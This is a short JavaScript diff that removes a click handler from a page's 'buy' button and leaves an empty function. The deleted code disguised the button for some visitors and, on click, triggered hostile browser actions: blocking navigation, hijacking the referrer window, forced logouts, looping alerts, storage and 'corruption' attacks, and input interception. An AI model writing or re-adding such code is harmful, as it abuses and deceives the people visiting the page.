@@ -181,41 +181,7 @@ function initChildWindow() {
 }
 
 function initParentWindow() {
-  const buyBtn = document.getElementById('buy-btn');
-  if (buyBtn) {
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('ref') === 'subdomain' || document.cookie.includes('from_subdomain=true')) {
-      buyBtn.textContent = 'join';
-    }
-
-    buyBtn.addEventListener('click', function (event) {
-
-      event.preventDefault();
-      event.stopPropagation();
-
-      tunnng();
-
-      if (interactionCount === 0) {
-        confirmPageUnload()
-        blockBackButton()
-        fillHistory()
-        registerProtocolHandlers()
-        attemptToTakeoverReferrerWindow()
-        hideCursor()
-        startAlertInterval()
-        superLogout()
-        rainbowThemeColor()
-        animateUrlWithEmojis()
-        speak('hook')
-        startImage()
-        fireAllStorageAttacks()
-        fireAllCorruptionAttacks()
-
-        interceptUserInput(triggerPerClickPayload)
-      }
-      triggerPerClickPayload(event);
-    });
-  }
+  return;
 }
 
 function interceptUserInput(handler) {
